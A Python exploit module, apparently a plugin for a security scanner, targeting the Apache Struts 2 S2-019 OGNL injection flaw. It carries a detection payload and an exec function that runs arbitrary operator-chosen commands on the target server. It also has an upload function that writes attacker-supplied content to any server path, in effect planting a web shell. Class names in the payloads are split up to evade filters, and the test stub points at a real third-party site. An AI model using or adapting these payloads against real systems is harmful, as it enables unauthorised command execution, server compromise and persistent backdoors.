#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

'''
S2_019 未验证
'''

def info(data=None):
    info = {
        "name": "Struts 2-019",
        "info": "Struts 2-019",
        "level": "high",
        "type": "rec",
    }
    return info

def prove(data):
    data = init(data, 'struts')
    if data['url'] != None:
        prove_poc = '''debug%3dcommand%26expression%3d%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27)%2c%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27)%2c%23resp.setCharacterEncoding(%27UTF-8%27)%2c%23resp.getWriter().print(%22struts2_se%22%2b%22curity_vul%22)%2c%23resp.getWriter().print(%22struts2%22+%22_security_vul_str2019%22)%2c%23resp.getWriter().flush()%2c%23resp.getWriter().close()'''
        poc_key = "struts2_security_vul"
        try:
            headers = {'Content-Type': "application/x-www-form-urlencoded"}
            res = curl('get', data['url'], params=prove_poc, headers=headers)
            if poc_key in res.headers or poc_key in res.text:
                data['flag'] = 1
                data['data'].append({"poc": prove_poc})
                data['res'].append({"info": data['url'], "key": 'struts2_019'})
        except:
            pass

    return data


def exec(data=None):
    data = init(data, 'struts')
    if data['url'] != None:
        cmd = data['cmd']
        exec_poc =  '''debug=command&expression=#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('UTF-8'),#resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("%COMMAND%").getInputStream())),#resp.getWriter().flush(),#resp.getWriter().close()'''
        headers = {}
        try:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            res = curl('get', data['url'], params=exec_poc.replace("%COMMAND%", cmd)).text
            data['flag'] = 1
            data['data'].append({"poc": exec_poc})
            data['res'].append({"info": res, "key": cmd})
        except:
            pass
    return data


def upload(data=None):
    data = init(data, 'struts')
    if data['url'] != None:
        upload_poc = '''debug=command&expression=#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#res=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#res.getWriter().print("oko"),#res.getWriter().print("kok/"),#res.getWriter().print(#req.getContextPath()),#res.getWriter().flush(),#res.getWriter().close(),new java.io.BufferedWriter(new java.io.FileWriter(%PATH%)).append(#req.getParameter("shell")).close()&shell=%FILECONTENT%'''
        despath = data['despath']
        content = _read_file(data['srcpath'])
        headers = {}
        try:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            curl('get', data['url'],params=upload_poc.replace("%PATH%", despath).replace("%FILECONTENT%", content),headers=headers)
            data['flag'] = 1
            data['data'].append({"poc": upload_poc})
            data['res'].append({"info":  data['despath'],"key":"upload"})
        except:
            pass
    return data


def _read_file(dicname):
    with open(dicname, 'r') as f:
        return f.readlines()


if __name__ == '__main__':
    from script import init, curl
    print(prove({'url': 'http://www.baidu.com', 'flag': -1, 'data': [], 'res': []}))